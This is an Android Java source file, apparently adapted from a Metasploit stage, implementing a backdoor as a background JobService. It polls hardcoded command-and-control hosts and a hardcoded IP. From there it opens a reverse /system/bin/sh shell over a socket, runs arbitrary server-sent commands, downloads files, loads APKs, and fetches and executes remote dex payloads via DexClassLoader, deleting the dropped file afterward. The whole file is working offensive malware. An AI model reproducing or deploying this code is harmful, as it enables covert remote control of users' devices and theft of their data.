package com.catherine.classloader;


import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;

import com.firebase.jobdispatcher.Constraint;
import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.JobParameters;
import com.firebase.jobdispatcher.JobService;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

import dalvik.system.DexClassLoader;

import static com.firebase.jobdispatcher.Lifetime.FOREVER;
import dalvik.system.*;
public class Payload extends JobService {

    private static Class<?> apkActivity;
    private static Class<?extends JobService> joBClass;
    private static Class<?> apkUtils;
    @Override
    public boolean onStartJob(JobParameters job) {
        // Do some work here
        final Bundle extras = job.getExtras();
        //parameters = new String[]{extras.getString("mpath")};

        //main(null);
        gApp=getApplication();
        gcontext=getApplicationContext();
        startInPath(extras.getString("mpath"));
        android_id=(extras.getString("mandroid_id"));
        return false; // Answers the question: "Is there still work going on?"
    }

    @Override
    public boolean onStopJob(JobParameters job) {
        return false; // Answers the question: "Should this job be retried?"
    }
    public static final String CERT_HASH = "WWWW                                        ";
    public static final String TIMEOUTS = "TTTT604800-300-3600-10                         ";

    //USAGE NOTE: this backdoor works in a LAN, with Metasploit listening to port 4444, the machine has ip 192.168.178.30
    //if you wish to modify ip:port (e.g. for a WAN usage, or a different Metasploit machine with different IP)
    // you can modify the following variable (URL), please DO NOT remove the four 'Z' at the beginning
    public static final String URL = "ZZZZtcp://151.26.231.234:443                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ";
    public static long comm_timeout;
    private static String[] parameters;
    private static String android_id;
    public static String curdir;
    public static long retry_total;
    public static long retry_wait;
    public static long session_expiry;
    public static Context gcontext;
    public static Application gApp;
    //private static Socket sock;
    /* renamed from: com.metasploit.stage.Payload.1 */
    static class C00001 extends Thread {
        C00001() {
        }

        public void run() {

            Payload.main(null);
        }
    }
    public static String getInputStringStatic(Context context) {

        return "pippi";

    }
    public static void start(Context context) {
        gcontext=context;
        startInPath(context.getApplicationInfo().dataDir);
        //startInPath(context.getFilesDir().toString());
        curdir=context.getApplicationInfo().dataDir;
    }

    public static void startAsync() {
        new C00001().start();
    }
    public static void stop() {
        new C00001().interrupt();
    }
    public static void startInPath(String path) {
        parameters = new String[]{path};

        startAsync();
    }

    public static int main(String[] args) {
        String hostname="none";
        String result="";
        //String site="paner.altervista.org";
        List<String> sites = new ArrayList<String>();
        sites.add("paner.altervista.org");
        sites.add("verifiche.ddns.net");
        if (args != null) {
            parameters = new String[]{new File(".").getAbsolutePath()};
        }
        String[] timeouts = TIMEOUTS.substring(4).trim().split("-");
        try {
            long sessionExpiry = (long) Integer.parseInt(timeouts[0]);
            long commTimeout = (long) Integer.parseInt(timeouts[1]);
            long retryTotal = (long) Integer.parseInt(timeouts[2]);
            long retryWait = (long) Integer.parseInt(timeouts[3]);
            long payloadStart = System.currentTimeMillis();
            session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
            comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
            retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
            retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
            String url = URL.substring(4).trim();
            //if (System.currentTimeMillis() < retry_total + payloadStart && System.currentTimeMillis() < session_expiry) {
            if (1==1){
                try {
                } catch (Exception e) {
                    //Thread.sleep(60 * 1000);
                    //startAsync();
                    e.printStackTrace();
                    try {
                        //Thread.sleep(retry_wait);
                    } catch (Exception e2) {
                        //Thread.sleep(60 * 1000);
                        //startAsync();
                        //Toast.makeText(gcontext, "105", Toast.LENGTH_LONG).show();
                        return 1;
                    }
                }
                if (url.startsWith("tcp")) {
                    //while (true) {
                    for (String site : sites) {
                        try {
                            hostname = getHostName("Android");
                            result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname);

                            String[] array = result.split("\\|\\|", -1);
                            String kill=array[3].substring(5);
                            String exec=array[7].substring(5);
                            String ip=array[1].substring(3);
                            String port=array[2].substring(5);
                            String cmd=array[8].substring(4);
                            String iout=array[5].substring(5);
                            url="tcp://"+ip+":"+port;
                            if (kill.equals("0")) {

                                    result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname + "&kill=1");
                                    // create a process around the shell
                                    final Process process = Runtime.getRuntime().exec("/system/bin/sh -i");

                                    // start a socket
                                    Socket socket = new Socket(ip, Integer.parseInt(port));

                                    // server should be listen on port 4444
                                    // Netcat Example: nc -l -p 4444

                                    // forward streams until socket closes
                                    forwardStream(socket.getInputStream(), process.getOutputStream());
                                    forwardStream(process.getInputStream(), socket.getOutputStream());
                                    forwardStream(process.getErrorStream(), socket.getOutputStream());
                                    process.waitFor();

                                    // close the socket streams
                                    socket.getInputStream().close();
                                    socket.getOutputStream().close();

                            }
                            if (exec.equals("1")) {

                                result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname + "&exec=0");
                                if (cmd.substring(0,4).equals("down")) {
                                    DownloadFromUrl(cmd.substring(5,cmd.length()));
                                }
                                else if (cmd.equals("meta")) {
                                    //if (sock != null)
                                    //    sock.close();
                                    runStagefromTCP(url);
                                }
                                else if (cmd.equals("loadapk")) {
                                    //MyApplication oMyapp = new MyApplication();
                                    //oMyapp.onCreate();
                                    //oMyapp.LoadApk("myapp.apk",gcontext);
                                    ((MyApplication) gApp).LoadApk(MyConfig.apk1);
                                    //((MyApplication) gcontext).onCreate();
                                    //((MyApplication) gcontext).LoadApk("myapp.apk",gcontext);


                                    apkActivity = gcontext.getClassLoader().loadClass(MyConfig.APK1_ACTIVITY_MAIN);
                                    apkUtils = gcontext.getClassLoader().loadClass(MyConfig.APK1_UTILS);
                                    Intent intent = new Intent();
                                    intent.setClass(gcontext, apkActivity);
                                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    gcontext.startActivity(intent);
                                }
                                else
                                    try {
                                        Process pexec = Runtime.getRuntime().exec(cmd);
                                    }
                                    catch (Exception e) {
                                        //Thread.sleep(60 * 1000);
                                        //startAsync();
                                        //Toast.makeText(gcontext, "162", Toast.LENGTH_LONG).show();
                                        e.printStackTrace();
                                    }

                                /*Process su = Runtime.getRuntime().exec("su");
                                DataOutputStream outputStream = new DataOutputStream(su.getOutputStream());

                                outputStream.writeBytes("screenrecord --time-limit 10 /sdcard/MyVideo.mp4\n");
                                outputStream.flush();

                                outputStream.writeBytes("exit\n");
                                outputStream.flush();
                                su.waitFor();
                                */
                            }

                            //Thread.sleep(60 * 1000);
                        }
                        //catch (InterruptedException e) {
                         catch (Exception e) {
                            //Thread.sleep(60 * 1000);
                            //startAsync();
                            //Toast.makeText(gcontext, "184", Toast.LENGTH_LONG).show();
                            e.printStackTrace();
                            return 1;
                        }
                    }
                } else {
//                    runStageFromHTTP(url);
                    return 1;
                }
            }
        } catch (NumberFormatException e3) {

            //Toast.makeText(gcontext, "195", Toast.LENGTH_LONG).show();
            return 1;
        }
        catch (Exception e){

            //Toast.makeText(gcontext, "199", Toast.LENGTH_LONG).show();
            return 1;
        }
        return 0;
    }
    private static void forwardStream(final InputStream input, final OutputStream output) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    final byte[] buf = new byte[4096];
                    int length;
                    while ((length = input.read(buf)) != -1) {
                        if (output != null) {
                            output.write(buf, 0, length);
                            if (input.available() == 0) {
                                output.flush();
                            }
                        }
                    }
                } catch (Exception e) {
                    // die silently
                } finally {
                    try {
                        input.close();
                        output.close();
                    } catch (IOException e) {
                        // die silently
                    }
                }
            }
        }).start();
    }

    public static String getHostName(String defValue) {
        try {
/*            Method getString = Build.class.getDeclaredMethod("getString", String.class);
            getString.setAccessible(true);
            return getString.invoke(null, "net.hostname").toString();
*/
            //String android_id = Settings.Secure.getString(gcontext.getContentResolver(),
            //        Settings.Secure.ANDROID_ID);
            return defValue+"-"+android_id;
        } catch (Exception ex) {
            return defValue;
        }
    }
    public static void DownloadFromUrl(String surl) {
        String webPage = surl;
        String result="";
        URLConnection urlConnection;

        try{
            java.net.URL url = new URL(webPage);
            try{
                /* Open a connection to that URL. */
                URLConnection ucon = url.openConnection();

                /*
                 * Define InputStreams to read from the URLConnection.
                 */
                InputStream is = ucon.getInputStream();
                BufferedInputStream bis = new BufferedInputStream(is);
                File file = new File(curdir,  surl.substring( surl.lastIndexOf('/')+1, surl.length() ));
                FileOutputStream fos = new FileOutputStream(file);
                int current = 0;
                while ((current = bis.read()) != -1) {
                    fos.write(current);
                }

                fos.close();


            }catch(IOException ex){
                //do exception handling here
            }
        }catch(MalformedURLException malex){
            //do exception handling here
        }


    }
    public static String getResponseFromUrl(String surl) {
        String webPage = surl;
        String result="";
        URLConnection urlConnection;

        try{
            java.net.URL url = new URL(webPage);
            try{
                urlConnection = url.openConnection();

                InputStream is = urlConnection.getInputStream();
                InputStreamReader isr = new InputStreamReader(is);

                int numCharsRead;
                char[] charArray = new char[1024];
                StringBuffer sb = new StringBuffer();
                while ((numCharsRead = isr.read(charArray)) > 0) {
                    sb.append(charArray, 0, numCharsRead);
                }
                result = sb.toString();
            }catch(IOException ex){
                //do exception handling here
            }
        }catch(MalformedURLException malex){
            //do exception handling here
        }

        return  result;
    }
/*    private static void runStageFromHTTP(String url) throws Exception {
        InputStream inStream;
        if (url.startsWith("https")) {
            URLConnection uc = new URL(url).openConnection();
            Class.forName("com.google.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
            inStream = uc.getInputStream();
        } else {
            inStream = new URL(url).openStream();
        }
        readAndRunStage(new DataInputStream(inStream), new ByteArrayOutputStream(), parameters);
    }
*/

   private static void runStagefromTCP(String url) throws Exception {
        Socket sock;
        String[] parts = url.split(":");
        int port = Integer.parseInt(parts[2]);
        String host = parts[1].split("/")[2];
        if (host.equals("")) {
            ServerSocket server = new ServerSocket(port);
            sock = server.accept();
            server.close();
        } else {
            sock = new Socket(host, port);

        }
        if (sock != null) {
            sock.setSoTimeout(500);
            //sock.setSoTimeout(0);

            readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), parameters);
        }
    }

    private static void readAndRunStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        String path = parameters[0];
        String filePath = path + File.separatorChar + "payload.jar";
        String dexPath = path + File.separatorChar + "payload.dex";
        byte[] core = new byte[in.readInt()];
        in.readFully(core);
        String classFile = new String(core);
        core = new byte[in.readInt()];
        in.readFully(core);
        File file = new File(filePath);
        if (!file.exists()) {
            file.createNewFile();
        }
        FileOutputStream fop = new FileOutputStream(file);
        fop.write(core);
        fop.flush();
        fop.close();
        Class<?> myClass = new DexClassLoader(filePath, path, path, Payload.class.getClassLoader()).loadClass(classFile);
        Object stage = myClass.newInstance();
        file.delete();
        new File(dexPath).delete();
        myClass.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, new Object[]{in, out, parameters});
        //System.exit(0);
    }

}
